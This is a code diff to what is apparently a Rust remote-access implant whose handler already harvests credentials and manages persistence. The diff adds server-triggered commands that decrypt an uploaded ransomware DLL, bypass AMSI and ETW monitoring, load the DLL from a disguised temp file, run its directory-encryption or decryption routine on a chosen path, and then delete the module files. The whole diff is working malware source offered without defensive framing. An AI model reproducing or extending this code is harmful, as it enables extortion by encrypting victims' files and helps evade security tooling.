@@ -104,6 +104,20 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                     let response = harvest_credentials();
                     writer.write_all(response.as_bytes()).ok();
                     writer.flush().ok();
+                } else if command.starts_with("__ENCRYPT__:") {
+                    // Comando para encriptar archivos: __ENCRYPT__:ruta:max_depth
+                    let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
+                    println!("DEBUG: Encrypting files: {}", params);
+                    let response = encrypt_files(params);
+                    writer.write_all(response.as_bytes()).ok();
+                    writer.flush().ok();
+                } else if command.starts_with("__DECRYPT__:") {
+                    // Comando para desencriptar archivos: __DECRYPT__:ruta:key:max_depth
+                    let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
+                    println!("DEBUG: Decrypting files: {}", params);
+                    let response = decrypt_files(params);
+                    writer.write_all(response.as_bytes()).ok();
+                    writer.flush().ok();
                 } else if !command.is_empty() {
                     let output = execute_command(command);
                     let response = format!("{}{}", output, DELIMITER);
@@ -480,3 +494,273 @@ fn handle_persistence_remove() -> String {
         }
     }
 }
+
+/// Encripta archivos usando la DLL de ransomware
+/// Parámetros: ruta:max_depth
+fn encrypt_files(params: &str) -> String {
+    println!("DEBUG: Encrypting files with params: {}", params);
+    
+    #[cfg(not(target_os = "windows"))]
+    {
+        return format!("__ERROR__:Ransomware solo soportado en Windows{}", DELIMITER);
+    }
+    
+    #[cfg(target_os = "windows")]
+    {
+        let parts: Vec<&str> = params.split(':').collect();
+        if parts.len() < 2 {
+            return format!("__ERROR__:Parámetros inválidos. Uso: __ENCRYPT__:ruta:max_depth{}", DELIMITER);
+        }
+        
+        let path = parts[0];
+        let max_depth: u32 = parts[1].parse().unwrap_or(5);
+        
+        // Verificar que existan los archivos subidos
+        if !Path::new("ransomware.enc").exists() {
+            return format!("__ERROR__:ransomware.enc no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
+        }
+        
+        if !Path::new("ransomware.key").exists() {
+            return format!("__ERROR__:ransomware.key no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
+        }
+        
+        // Leer archivos
+        let encrypted_dll = match fs::read("ransomware.enc") {
+            Ok(data) => data,
+            Err(e) => return format!("__ERROR__:Error leyendo ransomware.enc: {}{}", e, DELIMITER),
+        };
+        
+        let xor_key = match fs::read("ransomware.key") {
+            Ok(data) => data,
+            Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
+        };
+        
+        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
+        println!("DEBUG: Clave XOR: {} bytes", xor_key.len());
+        
+        // Desencriptar DLL
+        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
+        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
+        
+        // Evasión
+        println!("DEBUG: [EVASION] Bypassing AMSI...");
+        unsafe {
+            if evasion::bypass_amsi() {
+                println!("DEBUG: [EVASION] ✅ AMSI bypassed");
+            } else {
+                println!("DEBUG: [EVASION] ⚠️ AMSI bypass failed");
+            }
+            
+            println!("DEBUG: [EVASION] Bypassing ETW...");
+            if evasion::bypass_etw() {
+                println!("DEBUG: [EVASION] ✅ ETW bypassed");
+            } else {
+                println!("DEBUG: [EVASION] ⚠️ ETW bypass failed");
+            }
+        }
+        
+        // Cargar DLL
+        use std::os::raw::c_char;
+        use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, FreeLibrary};
+        use std::ffi::CString;
+        
+        let temp_dir = std::env::temp_dir();
+        let random_name = format!("~tmp{}.tmp", std::process::id());
+        let dll_path = temp_dir.join(random_name);
+        
+        println!("DEBUG: [EVASION] Writing DLL to temp: {}", dll_path.display());
+        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
+            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
+        }
+        
+        let result = unsafe {
+            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
+            let h_module = LoadLibraryA(path_cstring.as_ptr());
+            
+            if h_module.is_null() {
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
+            }
+            
+            println!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
+            
+            let fn_name = CString::new("encrypt_directory").unwrap();
+            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
+            
+            if fn_ptr.is_null() {
+                FreeLibrary(h_module);
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:encrypt_directory not found{}", DELIMITER);
+            }
+            
+            println!("DEBUG: [EVASION] ✅ Function found, executing...");
+            
+            // Ejecutar función
+            let path_c = CString::new(path).unwrap();
+            let exec_fn: extern "C" fn(*const c_char, u32) -> *mut c_char = std::mem::transmute(fn_ptr);
+            let result_ptr = exec_fn(path_c.as_ptr(), max_depth);
+            
+            if result_ptr.is_null() {
+                FreeLibrary(h_module);
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:encrypt_directory returned NULL{}", DELIMITER);
+            }
+            
+            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
+            
+            // Liberar memoria
+            let free_fn_name = CString::new("free_string").unwrap();
+            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
+            if !free_ptr.is_null() {
+                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
+                free_fn(result_ptr);
+            }
+            
+            FreeLibrary(h_module);
+            let _ = std::fs::remove_file(&dll_path);
+            
+            result_str
+        };
+        
+        // Eliminar archivos del módulo
+        fs::remove_file("ransomware.enc").ok();
+        fs::remove_file("ransomware.key").ok();
+        
+        println!("DEBUG: Resultado obtenido: {}", result);
+        
+        // Verificar si hubo error
+        if result.starts_with("ERROR:") {
+            return format!("__ERROR__:{}{}", result, DELIMITER);
+        }
+        
+        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
+    }
+}
+
+/// Desencripta archivos usando la DLL de ransomware
+/// Parámetros: ruta:key:max_depth
+fn decrypt_files(params: &str) -> String {
+    println!("DEBUG: Decrypting files with params: {}", params);
+    
+    #[cfg(not(target_os = "windows"))]
+    {
+        return format!("__ERROR__:Ransomware solo soportado en Windows{}", DELIMITER);
+    }
+    
+    #[cfg(target_os = "windows")]
+    {
+        let parts: Vec<&str> = params.split(':').collect();
+        if parts.len() < 3 {
+            return format!("__ERROR__:Parámetros inválidos. Uso: __DECRYPT__:ruta:key:max_depth{}", DELIMITER);
+        }
+        
+        let path = parts[0];
+        let key = parts[1];
+        let max_depth: u32 = parts[2].parse().unwrap_or(5);
+        
+        // Verificar que existan los archivos subidos
+        if !Path::new("ransomware.enc").exists() {
+            return format!("__ERROR__:ransomware.enc no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
+        }
+        
+        if !Path::new("ransomware.key").exists() {
+            return format!("__ERROR__:ransomware.key no encontrado. El servidor debe subirlo primero.{}", DELIMITER);
+        }
+        
+        // Leer archivos
+        let encrypted_dll = match fs::read("ransomware.enc") {
+            Ok(data) => data,
+            Err(e) => return format!("__ERROR__:Error leyendo ransomware.enc: {}{}", e, DELIMITER),
+        };
+        
+        let xor_key = match fs::read("ransomware.key") {
+            Ok(data) => data,
+            Err(e) => return format!("__ERROR__:Error leyendo ransomware.key: {}{}", e, DELIMITER),
+        };
+        
+        println!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
+        
+        // Desencriptar DLL
+        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
+        println!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
+        
+        // Evasión
+        unsafe {
+            evasion::bypass_amsi();
+            evasion::bypass_etw();
+        }
+        
+        // Cargar DLL
+        use std::os::raw::c_char;
+        use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, FreeLibrary};
+        use std::ffi::CString;
+        
+        let temp_dir = std::env::temp_dir();
+        let random_name = format!("~tmp{}.tmp", std::process::id());
+        let dll_path = temp_dir.join(random_name);
+        
+        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
+            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
+        }
+        
+        let result = unsafe {
+            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
+            let h_module = LoadLibraryA(path_cstring.as_ptr());
+            
+            if h_module.is_null() {
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
+            }
+            
+            let fn_name = CString::new("decrypt_directory").unwrap();
+            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
+            
+            if fn_ptr.is_null() {
+                FreeLibrary(h_module);
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:decrypt_directory not found{}", DELIMITER);
+            }
+            
+            // Ejecutar función
+            let path_c = CString::new(path).unwrap();
+            let key_c = CString::new(key).unwrap();
+            let exec_fn: extern "C" fn(*const c_char, *const c_char, u32) -> *mut c_char = std::mem::transmute(fn_ptr);
+            let result_ptr = exec_fn(path_c.as_ptr(), key_c.as_ptr(), max_depth);
+            
+            if result_ptr.is_null() {
+                FreeLibrary(h_module);
+                let _ = std::fs::remove_file(&dll_path);
+                return format!("__ERROR__:decrypt_directory returned NULL{}", DELIMITER);
+            }
+            
+            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
+            
+            // Liberar memoria
+            let free_fn_name = CString::new("free_string").unwrap();
+            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
+            if !free_ptr.is_null() {
+                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
+                free_fn(result_ptr);
+            }
+            
+            FreeLibrary(h_module);
+            let _ = std::fs::remove_file(&dll_path);
+            
+            result_str
+        };
+        
+        // Eliminar archivos del módulo
+        fs::remove_file("ransomware.enc").ok();
+        fs::remove_file("ransomware.key").ok();
+        
+        println!("DEBUG: Resultado obtenido: {}", result);
+        
+        // Verificar si hubo error
+        if result.starts_with("ERROR:") {
+            return format!("__ERROR__:{}{}", result, DELIMITER);
+        }
+        
+        format!("__RANSOMWARE__:{}{}", result, DELIMITER)
+    }
+}
+
